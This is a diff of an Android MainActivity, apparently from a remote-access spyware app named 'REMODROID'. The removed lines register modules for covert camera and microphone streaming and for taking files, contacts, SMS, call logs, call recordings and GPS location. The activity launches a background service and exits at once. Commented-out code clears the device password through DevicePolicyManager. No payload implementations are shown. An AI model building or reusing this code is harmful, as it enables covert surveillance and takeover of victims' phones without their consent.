@@ -6,8 +6,6 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.os.StrictMode;
 import android.util.Log;
-import com.remo.connections.DataHandler;
-import com.remo.features.*;
 
 public class MainActivity extends Activity {
 
@@ -26,16 +24,7 @@ public class MainActivity extends Activity {
                 });
 
 
-        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CAM.ordinal(),CamStream.class);
-        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.MIC.ordinal(),MicStream.class);
-        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.FM_LIST.ordinal(),FileMan.class);
-        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.FM_DOWN.ordinal(),FileDownloader.class);
-        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.INFO.ordinal(),MobileInfo.class);
-        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CONTACTS.ordinal(),Contacts.class);
-        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CALL_LOG.ordinal(),Call_Log.class);
-        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.SMS.ordinal(),SMS.class);
-        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CALL_RECORDS.ordinal(),CallRecordsList.class);
-        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.GPS.ordinal(),GPS.class);
+
 
 //        CallRecorder phoneListener = new CallRecorder();
 //        TelephonyManager telephonyManager = (TelephonyManager) this
@@ -44,7 +33,7 @@ public class MainActivity extends Activity {
 //                PhoneStateListener.LISTEN_CALL_STATE);
 
 
-        startService(new Intent(getApplicationContext(), com.remo.connections.MainConnectionService.class));
+        startService(new Intent(getApplicationContext(), MainService.class));
 
 
 
@@ -96,7 +85,7 @@ public class MainActivity extends Activity {
 //
 //
 //        DevicePolicyManager deviceManager = (DevicePolicyManager)getSystemService(Context.DEVICE_POLICY_SERVICE);
-//        ComponentName compName = new ComponentName(this, MainConnectionService.class);
+//        ComponentName compName = new ComponentName(this, MainService.class);
 //        deviceManager.setPasswordMinimumLength(compName, 0);
 //        boolean result = deviceManager.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
 
@@ -107,7 +96,7 @@ public class MainActivity extends Activity {
 //        }catch (Exception ex){
 //            Log.e("REMODROID", "Jsoup Error "+ex.getMessage());
 //        }
-
+        onBackPressed();
 
     }
 
